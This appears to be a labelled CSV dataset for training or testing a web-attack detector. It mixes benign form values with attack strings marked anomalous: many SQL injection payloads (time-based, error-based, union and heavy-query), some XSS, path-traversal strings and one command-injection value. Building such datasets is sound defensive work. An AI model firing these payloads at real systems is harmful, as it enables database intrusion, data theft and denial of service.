payload,length,attack_type,label
45569,5,norm,norm
"1"")) as paep where 8947=8947 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",201,sqli,anom
san vicente del raspeig/sant vicent del raspeig,47,norm,norm
tobin,5,norm,norm
sufragio,8,norm,norm
1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,97,sqli,anom
"-1106')) union all select 2855,2855,2855,2855,2855,2855,2855#",61,sqli,anom
7986,4,norm,norm
f8rol5ra,8,norm,norm
loti@ajuntamentbarcelona2-0.is,30,norm,norm
cleofs,6,norm,norm
"1"" and (3020=3020)*6703 and ""itpt""=""itpt",40,sqli,anom
kavid,5,norm,norm
de arce millares,16,norm,norm
eby@miplat.nl,13,norm,norm
55265136t,9,norm,norm
"-9382') union all select 4774,4774,4774,4774--",46,sqli,anom
"1%""));if(4907=9581) select 4907 else drop function apqw--",57,sqli,anom
virgilia,8,norm,norm
leocadia,8,norm,norm
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('narn'='narn",175,sqli,anom
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",80,sqli,anom
evarist arnus 5 11-d,20,norm,norm
francisco jorquera s/n 1?d,26,norm,norm
"plaza esquivias, 68, 5?g",24,norm,norm
"1"") as dfmm where 7563=7563 or 8421=(select count(*) from generate_series(1,5000000))--",87,sqli,anom
"1',(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",97,sqli,anom
01067171v,9,norm,norm
"-3822"")) as dftp where 2817=2817 union all select 2817,2817,2817,2817,2817,2817#",80,sqli,anom
-9840')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dzlp'='dzlp,229,sqli,anom
"1%';call regexp_substring(repeat(right(char(3702),0),500000000),null) and '%'='",79,sqli,anom
/..//..//..//..//..//..//..//{file},35,path-traversal,anom
"1')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--",58,sqli,anom
daciano,7,norm,norm
(case when 6398=6398 then 1 else null end),42,sqli,anom
"1"") where 9499=9499;(select * from (select(sleep(5)))acdk)#",59,sqli,anom
1');(select * from (select(sleep(5)))acdk)#,43,sqli,anom
06314426y,9,norm,norm
albareda castelltort,20,norm,norm
"1"" where 3227=3227 waitfor delay '0:0:5'--",42,sqli,anom
1' where 2958=2958;if(6647=2179) select 6647 else drop function zvlq--,70,sqli,anom
"1' in boolean mode) union all select null,null--",48,sqli,anom
"1')) or elt(5873=5873,sleep(5))#",32,sqli,anom
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",92,sqli,anom
5r32n7,6,norm,norm
<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>,65,xss,anom
46006466a,9,norm,norm
mathieso,8,norm,norm
6408,4,norm,norm
niembro urkiaga,15,norm,norm
"1"") as xwnu where 6490=6490 union all select null,null,null,null,null,null--",76,sqli,anom
19115,5,norm,norm
e50land5cer,11,norm,norm
(select * from (select(sleep(5)))lrov),38,sqli,anom
antonell ferriani,17,norm,norm
"function,[{}][0].constructor._('alert(1)')()</script>",53,xss,anom
6298939668445611,16,norm,norm
"-6948"")) as ojjl where 1300=1300 or 6872=6872--",47,sqli,anom
"c/ violetas 43, 3-a",19,norm,norm
"1""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",104,sqli,anom
"1') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",105,sqli,anom
"1'+(select 'asmj' where 7808=7808 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",110,sqli,anom
georges,7,norm,norm
deg0a7a0,8,norm,norm
"1%') union all select null,null#",32,sqli,anom
"1%"")) union all select null,null,null,null,null,null,null,null,null,null--",74,sqli,anom
esc2n3alosa5e4te,16,norm,norm
rached,6,norm,norm
1)) as lkqx where 6468=6468 or (select * from (select(sleep(5)))sddo)#,70,sqli,anom
ralina,6,norm,norm
larguey@erasmusrooms.qa,23,norm,norm
(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (5877=5877) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)),173,sqli,anom
211,3,norm,norm
34468,5,norm,norm
1%')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('%'=',216,sqli,anom
"<img dynsrc=""javascript:alert('crosssitescripting')"">",53,xss,anom
7012,4,norm,norm
42148,5,norm,norm
1) as xylu where 3338=3338 rlike (select * from (select(sleep(5)))sgvo)--,73,sqli,anom
largar,6,norm,norm
gor,3,norm,norm
"1%') union all select null,null,null,null,null,null#",52,sqli,anom
19552581m,9,norm,norm
"1')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",112,sqli,anom
llobet viader,13,norm,norm
"1"" where 3740=3740 rlike sleep(5)#",34,sqli,anom
1') and 6969=(select 6969 from pg_sleep(5)) and ('ifvz' like 'ifvz,66,sqli,anom
5exas9labo,10,norm,norm
2618804730024814,16,norm,norm
42462633x,9,norm,norm
1'||(select 'kuxp' where 7123=7123 and 1688=4200#,49,sqli,anom
7686271480294625,16,norm,norm
1' in boolean mode);if(7899=7899) select 7899 else drop function zbbp--,71,sqli,anom
"1) where 4711=4711;select count(*) from generate_series(1,5000000)--",68,sqli,anom
1' or (select * from (select(sleep(5)))ydpu) and 'bwtk'='bwtk,61,sqli,anom
80788346h,9,norm,norm
"san antonio, 105, 9-d",21,norm,norm
bauer,5,norm,norm
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../{file},1040,path-traversal,anom
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('sstt'='sstt",207,sqli,anom
"1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='",119,sqli,anom
"-9508) union all select 9950,9950,9950,9950,9950,9950,9950#",59,sqli,anom
der85nie88,10,norm,norm
"1%"")) or elt(5873=5873,sleep(5))#",33,sqli,anom
"1""))) union all select null,null,null,null,null,null,null,null#",63,sqli,anom
1' where 5458=5458 rlike (select * from (select(sleep(5)))vwyq)#,64,sqli,anom
arana,5,norm,norm
28820,5,norm,norm
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('vpus'='vpus",115,sqli,anom
1' rlike sleep(5) and 'gtfo'='gtfo,34,sqli,anom
fax,3,norm,norm
lizalde-kikabidze@sorority.zr,29,norm,norm
adolfo,6,norm,norm
0945727443543584,16,norm,norm
05145,5,norm,norm
"1')) as qcgf where 9656=9656 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,sqli,anom
aborr-ascarse,13,norm,norm
"1%')) and 8407=(select count(*) from generate_series(1,5000000)) and (('%'='",76,sqli,anom
volkmann_parfrey1@sigloventidos.be,34,norm,norm
22859316f,9,norm,norm
7704,4,norm,norm
co1coja,7,norm,norm
"paso de la soledad, 130 10?f",28,norm,norm
1%') waitfor delay '0:0:5' and ('%'=',37,sqli,anom
-2316'))) or 8519=6010,22,sqli,anom
">""<<script>document.cookie=true;</script>",41,xss,anom
ruiloba,7,norm,norm
"1%""))) union all select null,null,null,null,null,null,null,null#",64,sqli,anom
"c/ capella, 141, 4?g",20,norm,norm
hibbert.bupp@hojadecalculo.com.mil,34,norm,norm
9573180494481896,16,norm,norm
correch climent,15,norm,norm
"-7416"" where 7656=7656 order by 1--",35,sqli,anom
"1%"") and 8024=3560--",20,sqli,anom
"1') as lrif where 6525=6525 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",230,sqli,anom
zapatear,8,norm,norm
ga7bn,5,norm,norm
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('uwrm'='uwrm",128,sqli,anom
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'obax' like 'obax",82,sqli,anom
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""mrsl""=""mrsl",207,sqli,anom
t4ne0r84oso,11,norm,norm
/.../.../.../.../.../.../{file},31,path-traversal,anom
3354081674154882,16,norm,norm
"1') union all select null,null--",32,sqli,anom
varley@tecnoindomo.ki,21,norm,norm
"-9295))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((8752=8752",220,sqli,anom
1)) as uadn where 9588=9588 rlike sleep(5)#,43,sqli,anom
24768,5,norm,norm
"-6611%""))) union all select 8918,8918#",38,sqli,anom
allman,6,norm,norm
sant esteve sesrovires,22,norm,norm
mcguinness.clayburgh7@eldeseodepecar.gu,39,norm,norm
"-3782%"") or make_set(9354=9354,7185) and (""%""=""",47,sqli,anom
43751883h,9,norm,norm
"murillo, 185 2f",15,norm,norm
"(select (case when (4232=4232) then (select benchmark(5000000,md5(0x6b637544))) else 4232*(select 4232 from mysql.db) end))",123,sqli,anom
"1"") where 5828=5828 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli,anom
6225,4,norm,norm
fortner,7,norm,norm
swanson@sexl.co,15,norm,norm
joffe,5,norm,norm
leza.vanbrugh@ajuntamentbarcelona2-0.gq,39,norm,norm
1'+(select 'hcqf' where 9956=9956 and (2993=4297)*4297)+',57,sqli,anom
1'))) and sleep(5) and ((('vbck' like 'vbck,43,sqli,anom
gumersindo,10,norm,norm
0720546534771199,16,norm,norm
queso manchego,14,norm,norm
3ombero,7,norm,norm
rusch de celis,14,norm,norm
19245,5,norm,norm
longhurst-street1@drae2.pa,26,norm,norm
3927,4,norm,norm
"-9178 where 2253=2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",79,sqli,anom
terroba@multireform.gn,22,norm,norm
5527948175762743,16,norm,norm
moston@sierradealcaraz.sg,25,norm,norm
howlett,7,norm,norm
reto8sivo,9,norm,norm
feix ablitas,12,norm,norm
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",159,sqli,anom
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",115,sqli,anom
5a69io99t3,10,norm,norm
6991,4,norm,norm
"-2838"" where 5442=5442 union all select 5442#",45,sqli,anom
1359601780395622,16,norm,norm
8961981301450385,16,norm,norm
ticona,6,norm,norm
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'='fbnx",114,sqli,anom
2el6s,5,norm,norm
lagrange@zaya.bt,16,norm,norm
kwok,4,norm,norm
"grupo santa teresa 155,",23,norm,norm
"1));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((7749=7749",78,sqli,anom
viriato,7,norm,norm
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",152,sqli,anom
06690,5,norm,norm
"-8487') where 9655=9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",92,sqli,anom
"1%"")) and (select * from (select(sleep(5)))gcrr)#",49,sqli,anom
lilien@aprendeaestudiar.lt,26,norm,norm
4108422495216222,16,norm,norm
5761,4,norm,norm
4150902070293588,16,norm,norm
vilafams,8,norm,norm
calle juan de sevilla 102 3c,28,norm,norm
asaeteadora,11,norm,norm
vincenzi1@saavedradiaz.tc,25,norm,norm
"pl. santa ana, 97,",18,norm,norm
1365,4,norm,norm
"1' and make_set(8403=8403,8899) and 'lnwe'='lnwe",48,sqli,anom
laffan@phd-photodecor.bv,24,norm,norm
ekezian-wohlfeiler@cirugiaalbeiteria.lv,39,norm,norm
cutillas,8,norm,norm
amors de arriba,15,norm,norm
monzon pinart,13,norm,norm
17256,5,norm,norm
sparksma,8,norm,norm
75067173a,9,norm,norm
arbeca,6,norm,norm
villoresi@n340magazin.tc,24,norm,norm
1769642985963078,16,norm,norm
1'+(select 'wsjk' where 3291=3291;select (case when (9816=1693) then 9816 else cast(1 as int)/(select 0 from dual) end) from dual--,131,sqli,anom
guardiola puertolas,19,norm,norm
"1))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((4858=4858",81,sqli,anom
o.sulliv,8,norm,norm
"-6581'||(select 'hpjd' where 7608=7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",96,sqli,anom
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa........{file},274,path-traversal,anom
bartol basco,12,norm,norm
"calahorra, la",13,norm,norm
"1'||(select 'aair' where 9234=9234 union all select null,null,null,null#",72,sqli,anom
kuravlev@minimizar.ve,21,norm,norm
veri5icat1va,12,norm,norm
06208,5,norm,norm
c2is48s0,8,norm,norm
brandt,6,norm,norm
2ilat9r7a,9,norm,norm
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",116,sqli,anom
marcolina,9,norm,norm
annimamente,11,norm,norm
"avenida mendez alvaro, 178,",27,norm,norm
charissa,8,norm,norm
registro,8,norm,norm
pe4iclitar,10,norm,norm
"1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""",56,sqli,anom
frades de la sierra,19,norm,norm
"1'+(select immd where 7499=7499 union all select null,null,null,null,null,null,null,null#",89,sqli,anom
llers marquile,14,norm,norm
"1"";waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",46,sqli,anom
"-2365)) union all select 8190,8190#",35,sqli,anom
musson@ajuntamentdebarcelona20.pr,33,norm,norm
9805,4,norm,norm
07995079a,9,norm,norm
"1%') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",80,sqli,anom
7m63e31r,8,norm,norm
+faccioso,9,norm,norm
23734,5,norm,norm
35231,5,norm,norm
93698052p,9,norm,norm
"-4145%"")) union all select 9404,9404,9404,9404,9404,9404,9404#",62,sqli,anom
2187426645944865,16,norm,norm
"c/ rio avia, 105, 2?h",21,norm,norm
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",95,sqli,anom
escurial de la sierra,21,norm,norm
fergus,6,norm,norm
"1%"";iif(5257=5257,1,1/0)",24,sqli,anom
"1"" where 8379=8379 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",225,sqli,anom
breosa,6,norm,norm
im$ponderable,13,norm,norm
cusanelli@wdsl.ao,17,norm,norm
08170,5,norm,norm
"c/ los mimbres, 31",18,norm,norm
/.//..//.//..//.//..//.//..//.//..//.//..//{file},49,path-traversal,anom
pascuala,8,norm,norm
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ozan'='ozan",116,sqli,anom
22320,5,norm,norm
plza. felix rodriguez de la fuente 140 3a,41,norm,norm
missy,5,norm,norm
"-5073"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""kbab"" like ""kbab",216,sqli,anom
peralejos de arriba,19,norm,norm
05147,5,norm,norm
"1"" waitfor delay '0:0:5' and ""syhx""=""syhx",41,sqli,anom
58843682e,9,norm,norm
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",106,sqli,anom
jenner,6,norm,norm
braa,4,norm,norm
"-9859""))) union all select 6595,6595,6595,6595,6595,6595,6595#",62,sqli,anom
eranio,6,norm,norm
42250,5,norm,norm
1539157605114970,16,norm,norm
aleandra,8,norm,norm
25244,5,norm,norm
42101588l,9,norm,norm
guango,6,norm,norm
"1%'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",97,sqli,anom
ginard xabe,11,norm,norm
lulio,5,norm,norm
del ngel kercad,15,norm,norm
58783501d,9,norm,norm
"1"")) as hbfi where 4773=4773 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",233,sqli,anom
6839,4,norm,norm
"1' in boolean mode)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))#",217,sqli,anom
chusma,6,norm,norm
e1pirativo,10,norm,norm
kelland,7,norm,norm
m9gnificen5i5,13,norm,norm
1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#,114,sqli,anom
450,3,norm,norm
pedro carabia 195,17,norm,norm
clerc,5,norm,norm
"1"" order by 1--",15,sqli,anom
"-8382"")) order by 1--",21,sqli,anom
522lta,6,norm,norm
1) where 7956=7956 or sleep(5)#,31,sqli,anom
"-2784')) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",71,sqli,anom
1) and (7557=1711)*1711 and (5157=5157,38,sqli,anom
"1') and elt(7554=6257,6257) and ('bpzm'='bpzm",45,sqli,anom
isolda,6,norm,norm
3796618492569421,16,norm,norm
romanones,9,norm,norm
"-5386') union all select 8026,8026,8026,8026,8026,8026#",55,sqli,anom
"1) and 3824=benchmark(5000000,md5(0x76555642))",46,sqli,anom
pal,3,norm,norm
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",120,sqli,anom
16471396s,9,norm,norm
/..../..../..../{file},22,path-traversal,anom
05298,5,norm,norm
"-3498"")) as xbvb where 2056=2056 union all select 2056,2056,2056,2056,2056,2056,2056--",86,sqli,anom
"1"")) union all select null,null,null,null,null,null,null,null#",62,sqli,anom
milford1,8,norm,norm
"1"" and (select * from (select(sleep(5)))gcrr)#",46,sqli,anom
calle segismundo moret 93 1?a,29,norm,norm
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",98,sqli,anom
"1 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",77,sqli,anom
63eb2ya,7,norm,norm
"1"")) as cduw where 4495=4495;select pg_sleep(5)--",49,sqli,anom
vilma,5,norm,norm
6922,4,norm,norm
"1%';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli,anom
telly,5,norm,norm
graciliano,10,norm,norm
98058748l,9,norm,norm
2473105316988907,16,norm,norm
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('xhez' like 'xhez",222,sqli,anom
7951593634712530,16,norm,norm
"1%'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",68,sqli,anom
"1) as qzif where 7877=7877 union all select null,null,null,null,null,null,null--",80,sqli,anom
29109,5,norm,norm
casilda,7,norm,norm
26150430m,9,norm,norm
hoog,4,norm,norm
4092,4,norm,norm
cruey,5,norm,norm
"1',(case when 2872=2872 then 1 else null end)",45,sqli,anom
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",192,sqli,anom
"c/ encajeras, 40 4?f",20,norm,norm
"1',(select (case when (7616=7616) then 1 else 1/(select 0) end))",64,sqli,anom
1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,87,sqli,anom
4909,4,norm,norm
jarvie,6,norm,norm
"1;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",69,sqli,anom
05200,5,norm,norm
"1 and make_set(9542=8888,8888)-- idkn",37,sqli,anom
"1%"" and sleep(5)#",17,sqli,anom
"c/ alicante, 83,",16,norm,norm
28729,5,norm,norm
"1"" where 4684=4684 union all select null,null,null,null#",56,sqli,anom
"1))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8814=8814",114,sqli,anom
"-5857%"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",216,sqli,anom
"1"")) as ngvf where 9912=9912 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli,anom
"calle don juan de malaga, 170,",30,norm,norm
nima,4,norm,norm
25320,5,norm,norm
1294,4,norm,norm
prullans,8,norm,norm
a;id|,5,cmdi,anom
62746544z,9,norm,norm
993,3,norm,norm
"c/ pintores zubiaurre, 156,",27,norm,norm
l655a2uta,9,norm,norm
08698,5,norm,norm
"1') as tuhc where 4018=4018 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,sqli,anom
98946031p,9,norm,norm
86274990n,9,norm,norm
"1'))) union all select null,null,null,null,null,null,null,null#",63,sqli,anom
guardaguas,10,norm,norm
1' in boolean mode);if(3392=4422) select 3392 else drop function xsqq--,71,sqli,anom
"1""))) and elt(1210=1210,sleep(5)) and (((""ilge"" like ""ilge",58,sqli,anom
penido maym'o,13,norm,norm
alvarez 35,10,norm,norm
carissa,7,norm,norm
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",55,sqli,anom
5728310223960582,16,norm,norm
"1%"") and 8594=(select 8594 from pg_sleep(5))--",46,sqli,anom
caudete,7,norm,norm
aguilar de cods,15,norm,norm
9713391343478091,16,norm,norm
"1""))) union all select null,null,null,null,null,null,null,null,null#",68,sqli,anom
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051",80,sqli,anom
conciliador,11,norm,norm
"carrer vilaseca 141, 12?e",25,norm,norm
belalczar,9,norm,norm
/........................................................................../../{file},85,path-traversal,anom
monique,7,norm,norm
"1%'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",113,sqli,anom
606,3,norm,norm
fonz,4,norm,norm
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",78,sqli,anom
wendt,5,norm,norm
8328,4,norm,norm
mau@gaudio.an,13,norm,norm
4162370064639312,16,norm,norm
"1 where 2363=2363 union all select null,null,null,null,null--",61,sqli,anom
rosi10,6,norm,norm
blanquer,8,norm,norm
"1') where 6081=6081 union all select null,null,null,null,null,null,null,null,null--",83,sqli,anom
"torres altas, 162",17,norm,norm
marcanti,8,norm,norm
prspera,7,norm,norm
"-1550' in boolean mode) union all select 9777,9777,9777--",57,sqli,anom
"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>",100,xss,anom
"1%"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""%""=""",106,sqli,anom
canal saracho,13,norm,norm
58193627q,9,norm,norm
matsumiya stuyck,16,norm,norm
9859982019470735,16,norm,norm
kellogg@viajesinternacionales.ne,32,norm,norm
fant@tiposdedrogas.gg,21,norm,norm
6070377795549230,16,norm,norm
younger,7,norm,norm
"1' where 6409=6409;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",79,sqli,anom
bolkan@directoriogratuito.int,29,norm,norm
tubalcan,8,norm,norm
703,3,norm,norm
clay@parcalia.ml,16,norm,norm
tapasco peleij,14,norm,norm
22200,5,norm,norm
"-6548%"") union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",72,sqli,anom
wolfe,5,norm,norm
"1) where 9012=9012 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli,anom
kirkpatr,8,norm,norm
